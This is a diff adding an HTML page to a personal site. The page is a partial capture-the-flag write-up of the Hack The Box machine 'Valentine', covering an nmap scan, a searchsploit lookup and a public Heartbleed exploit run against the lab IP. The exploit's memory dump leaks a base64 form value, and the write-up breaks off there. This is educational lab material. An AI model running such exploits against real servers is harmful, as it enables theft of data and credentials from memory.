@@ -1,0 +1,274 @@
+<!--
+Author: W3layouts
+Author URL: http://w3layouts.com
+-->
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>My Website a Personal Portfolio Category Bootstrap Responsive Website Template | About :: W3layouts</title>
+    <!-- web fonts -->
+    <link href="//fonts.googleapis.com/css?family=Nunito:400,600,700,800,900&display=swap" rel="stylesheet">
+    <link href="//fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <!-- //web fonts -->
+    <!-- Template CSS -->
+    <link rel="stylesheet" href="/assets/css/style-starter.css">
+  </head>
+  <body>
+
+<section class="w3l-bootstrap-header">
+  <nav class="navbar navbar-expand-lg navbar-light py-lg-3 py-2">
+    <div class="container">
+      <a class="navbar-brand" href="index.html"> My Website</a>
+      <!-- if logo is image enable this   
+    <a class="navbar-brand" href="#index.html">
+        <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
+    </a> -->
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon fa fa-bars"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/about.html">About</a>
+          </li>
+        </ul>
+        
+      </div>
+    </div>
+  </nav>
+</section>
+<section class="w3l-about-breadcrum">
+  <div class="breadcrum-bg">
+    <div class="container py-5">
+      <p><a href="index.html">Home</a> &nbsp; / &nbsp; Posts &nbsp;/ &nbsp; Valentine</p>
+     </div>
+  </div>
+</section>
+<!-- w3l-content-photo-5 -->
+<div class="w3l-content-photo-5 py-5" id="about">
+	<div class="content-main pt-lg-5 pt-md-3 pb-0">
+		<div class="container">
+            <div style="text-align:center;padding-top: 10px">
+           					<a ><img src="/Posts/Valentine/0.png" class="img-fluid" alt="content-photo" ></a>
+                    <h3 class = "mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Valentine</h3>
+					          <p class="mb-2">Posted on 6/19</p>
+                    <p class="mb-2">Source: <a href="https://www.hackthebox.eu/" target="_blank" style="color: #33cc33;text-align:right"> hackthebox</a></p>
+                    <h3 class="mb-2"style="font-size: 35px;line-height: 45px;color: var(--title-color);font-weight: 700; }">Enumeration</h3>
+                    <p class="mb-2">Let's begin with nmap</p>
+            </div>
+            <div class=hljs>
+                <a>
+                kali@kali:~/hackthebox/Practice$ cat nmap.txt<br>
+                # Nmap 7.80 scan initiated Thu Jun 18 09:50:11 2020 as: nmap -sC -sV -p- -oN nmap.txt 10.10.10.79 <br>
+                Nmap scan report for 10.10.10.79<br>
+                Host is up (0.028s latency).<br>
+                Not shown: 65532 closed ports<br>
+                PORT    STATE SERVICE  VERSION<br>
+                22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)<br>
+                | ssh-hostkey: <br>
+                |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)                                                    <br>
+                |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)<br>
+                |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)<br>
+                80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))<br>
+                |_http-server-header: Apache/2.2.22 (Ubuntu)<br>
+                |_http-title: Site doesn't have a title (text/html).<br>
+                443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))<br>
+                |_http-server-header: Apache/2.2.22 (Ubuntu)<br>
+                |_http-title: Site doesn't have a title (text/html).<br>
+                | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US<br>
+                | Not valid before: 2018-02-06T00:45:25<br>
+                |_Not valid after:  2019-02-06T00:45:25<br>
+                |_ssl-date: 2020-06-18T13:53:02+00:00; +1m55s from scanner time.<br>
+                Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<b
+                Host script results:<br>
+                |_clock-skew: 1m54s<b
+                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+                # Nmap done at Thu Jun 18 09:51:07 2020 -- 1 IP address (1 host up) scanned in 55.79 seconds<br>
+                </a> 
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+              <p class="mb-2" style="font-weight:100">Nice there aren't too many ports. We have http, https, and ssh. Lets look at the webapp and start gobuster.</p>
+     					<a ><img src="/Posts/Valentine/1.png" class="img-fluid" alt="content-photo" ></a>
+              <p class="mb-2" style="font-weight:100">After a reverse search, i
+              t turns out the heart in the background of the photo is the logo for 
+              the vulnerability heartbleed. According to heartbleed.com, "This 
+              weakness allows stealing the information protected, under normal 
+              conditions, by the SSL/TLS encryption used to secure the Internet." 
+              Let's see if there are any vulnerabilities for this.</p>
+            </div>
+            <div class="hljs">
+              <a>
+              kali@kali:~/hackthebox/Practice$ searchsploit heartbleed</br>
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------</br>
+ Exploit Title                                                                                                             |  Path</br>
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------</br>
+OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                        | multiple/remote/32764.py</br>
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                        | multiple/remote/32791.c</br>
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                         | multiple/remote/32998.c</br>
+OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                           | multiple/remote/32745.py</br>
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------</br>
+Shellcodes: No Results</br>
+kali@kali:~/hackthebox/Practice$ cp /usr/share/exploitdb/exploits/multiple/remote/32764.py .</br>
+kali@kali:~/hackthebox/Practice$ python 32764.py 10.10.10.79</br>
+Trying SSL 3.0...</br>
+Connecting...</br>
+Sending Client Hello...</br>
+Waiting for Server Hello...</br>
+ ... received message: type = 22, ver = 0300, length = 94</br>
+ ... received message: type = 22, ver = 0300, length = 885</br>
+ ... received message: type = 22, ver = 0300, length = 331</br>
+ ... received message: type = 22, ver = 0300, length = 4</br>
+Sending heartbeat request...</br>
+ ... received message: type = 24, ver = 0300, length = 16384</br>
+Received heartbeat response:</br>
+  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...</br>
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......</br>
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".</br>
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.</br>
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................</br>
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.</br>
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...</br>
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............</br>
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................</br>
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.</br>
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............</br>
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................</br>
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................</br>
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 00 00 00 00  ....#...........</br>
+  00e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</br>
+  00f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</br>
+  0100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</br>
+</br>
+WARNING: server returned more data than it should - server is vulnerable!</br>
+              </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+            We didn't get much, but after running it a few more times, I got more data back.
+            </p>
+            </div>
+            <div class="hljs">
+            <a>
+            kali@kali:~/hackthebox/Practice$ python 32764.py 10.10.10.79 > data<br>
+kali@kali:~/hackthebox/Practice$ head data -n 60<br>
+Trying SSL 3.0...<br>
+Connecting...<br>
+Sending Client Hello...<br>
+Waiting for Server Hello...<br>
+ ... received message: type = 22, ver = 0300, length = 94<br>
+ ... received message: type = 22, ver = 0300, length = 885<br>
+ ... received message: type = 22, ver = 0300, length = 331<br>
+ ... received message: type = 22, ver = 0300, length = 4<br>
+Sending heartbeat request...<br>
+ ... received message: type = 24, ver = 0300, length = 16384<br>
+Received heartbeat response:<br>
+  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...<br>
+  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......<br>
+  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".<br>
+  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.<br>
+  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................<br>
+  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.<br>
+  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...<br>
+  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............<br>
+  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................<br>
+  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.<br>
+  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............<br>
+  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................<br>
+  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................<br>
+  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.<br>
+  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co<br>
+  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl<br>
+  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo<br>
+  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C<br>
+  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4<br>
+  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc<br>
+  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld<br>
+  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 32  mV0aGVoeXBlCg==2<br>
+  0160: 7D 7E 82 72 67 5A 3B DC AB 62 EE 16 42 70 00 7B  }~.rgZ;..b..Bp.{<br>
+  0170: FF 88 46 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..F.............<br>
+            </a>
+            </div>
+            <div style="text-align:center;padding-top: 10px">
+            <p class="mb-2" style="font-weight:100">
+The text variable turns out to be $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==, 
+the two equal signs at the end means it's probably in base64.            </p>
+            </div>
+     </div>
+  </div>  
+</div>
+
+ <section class="w3l-footer-29-main" id="footer">
+  <div class="footer-29 text-center">
+      <div class="container">
+        
+          <div class="bottom-copies text-center">
+              <p class="copy-footer-29">© 2020 My Website. All rights reserved | Designed by <a href="https://w3layouts.com">W3layouts</a></p>
+               
+          </div>
+      </div>
+  </div>
+   <!-- move top -->
+  <button onclick="topFunction()" id="movetop" title="Go to top">
+              <span class="fa fa-angle-up"></span>
+                 </button>
+                 <script>
+                     // When the user scrolls down 20px from the top of the document, show the button
+                     window.onscroll = function () {
+                         scrollFunction()
+                     };
+              
+                     function scrollFunction() {
+                         if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                             document.getElementById("movetop").style.display = "block";
+                         } else {
+                             document.getElementById("movetop").style.display = "none";
+                         }
+                     }
+              
+                     // When the user clicks on the button, scroll to the top of the document
+                     function topFunction() {
+                         document.body.scrollTop = 0;
+                         document.documentElement.scrollTop = 0;
+                     }
+                 </script>
+                 <!-- /move top -->
+</section>
+<!-- // grids block 5 -->
+<script src="assets/js/jquery-3.3.1.min.js"></script>
+<!-- //footer-28 block -->
+</section>
+
+<script>
+    $(function () {
+      $('.navbar-toggler').click(function () {
+        $('body').toggleClass('noscroll');
+      })
+    });
+  </script>
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous">
+  </script>
+  
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous">
+  </script>
+
+<!-- Smooth scrolling -->
+
+
+
+</body>
+
+</html>
+<!-- // grids block 5 -->
+
